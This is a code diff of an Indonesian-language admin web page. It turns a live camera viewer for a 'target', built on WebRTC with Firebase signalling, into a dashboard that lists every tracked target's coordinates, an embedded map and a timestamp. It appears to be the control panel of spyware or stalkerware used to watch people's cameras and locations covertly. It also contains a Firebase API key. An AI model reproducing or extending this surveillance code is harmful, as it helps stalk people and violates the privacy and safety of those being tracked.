@@ -2,30 +2,39 @@
 <html lang="id">
 <head>
 <meta charset="UTF-8">
-<title>Admin Monitor</title>
+<title>Panel Admin Target</title>
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <style>
-body{background:#020617;color:#fff;text-align:center;font-family:Arial;padding:20px;}
-video{width:95%;max-width:420px;margin-top:20px;border-radius:12px;background:#000;}
-.statusBox{background:#1e293b;padding:15px;border-radius:10px;margin-top:20px;max-width:450px;margin:auto;}
-.green{color:#22c55e;font-weight:bold;}
-.red{color:#ef4444;font-weight:bold;}
+body{background:#020617;color:#fff;font-family:Arial;padding:20px;}
+table{width:100%;border-collapse:collapse;margin-top:20px;}
+th,td{
+  padding:10px;border-bottom:1px solid #334155;text-align:left;
+}
+tr:hover{ background:#1e293b; }
+.map{
+  width:100%;height:200px;border-radius:10px;margin-top:10px;
+}
 </style>
 </head>
 <body>
 
-<h1>Admin – Monitor Kamera Target</h1>
+<h1>Admin – Daftar Semua Target</h1>
 
-<div class="statusBox">
-  <p>Status Target: <span id="status" class="red">OFFLINE</span></p>
-</div>
-
-<video id="remoteVideo" autoplay playsinline></video>
+<table>
+<thead>
+<tr>
+  <th>User</th>
+  <th>Lokasi</th>
+  <th>Maps</th>
+  <th>Waktu</th>
+</tr>
+</thead>
+<tbody id="dataTable"></tbody>
+</table>
 
 <script type="module">
-import { initializeApp } from "https://www.gstatic.com/firebasejs/12.6.0/firebase-app.js";
-import { getDatabase, ref, onValue, push, onChildAdded, update }
-from "https://www.gstatic.com/firebasejs/12.6.0/firebase-database.js";
+import { initializeApp } from "https://www.gstatic.com/firebasejs/10.0.0/firebase-app.js";
+import { getDatabase, ref, onValue } from "https://www.gstatic.com/firebasejs/10.0.0/firebase-database.js";
 
 const firebaseConfig = {
   apiKey: "AIzaSyDxgnLu6TtJce2hd1DL07z5MWo62blEgC8",
@@ -40,55 +49,29 @@ const firebaseConfig = {
 const app = initializeApp(firebaseConfig);
 const db  = getDatabase(app);
 
-const statusEl = document.getElementById("status");
+onValue(ref(db, "targets"), snap => {
+  const data = snap.val();
+  const table = document.getElementById("dataTable");
+  table.innerHTML = "";
 
-// UPDATE STATUS ONLINE/OFFLINE
-onValue(ref(db,"room/default/status"), snap=>{
-    const s = snap.val();
-    if(!s) return;
-    if(s.target === "ONLINE"){
-        statusEl.textContent = "ONLINE";
-        statusEl.className = "green";
-    } else {
-        statusEl.textContent = "OFFLINE";
-        statusEl.className = "red";
-    }
-});
+  if(!data) return;
 
-// WebRTC
-const pc = new RTCPeerConnection({ iceServers:[{ urls:"stun:stun.l.google.com:19302"}] });
+  Object.keys(data).forEach(user=>{
+    const t = data[user];
 
-const remoteVideo = document.getElementById("remoteVideo");
-
-const callRef   = ref(db,"room/default/call");
-const callerICE = ref(db,"room/default/callerICE");
-const calleeICE = ref(db,"room/default/calleeICE");
-
-pc.ontrack = e => {
-    remoteVideo.srcObject = e.streams[0];
-};
-
-pc.onicecandidate = e=>{
-    if(e.candidate) push(calleeICE, e.candidate.toJSON());
-};
-
-// Listen OFFER from target → send ANSWER
-onValue(callRef, async snap=>{
-    const data = snap.val();
-    if(!data?.offer) return;
-
-    await pc.setRemoteDescription(new RTCSessionDescription(data.offer));
-
-    const answer = await pc.createAnswer();
-    await pc.setLocalDescription(answer);
-
-    await update(callRef,{ answer });
-});
-
-// Receive ICE from target
-onChildAdded(callerICE, snap=>{
-    const cand = snap.val();
-    if(cand) pc.addIceCandidate(new RTCIceCandidate(cand));
+    table.innerHTML += `
+      <tr>
+        <td>${user}</td>
+        <td>${t.lat.toFixed(5)}, ${t.lon.toFixed(5)}</td>
+        <td>
+          <iframe class="map"
+            src="https://www.google.com/maps?q=${t.lat},${t.lon}&z=15&output=embed">
+          </iframe>
+        </td>
+        <td>${t.time}</td>
+      </tr>
+    `;
+  });
 });
 </script>
 
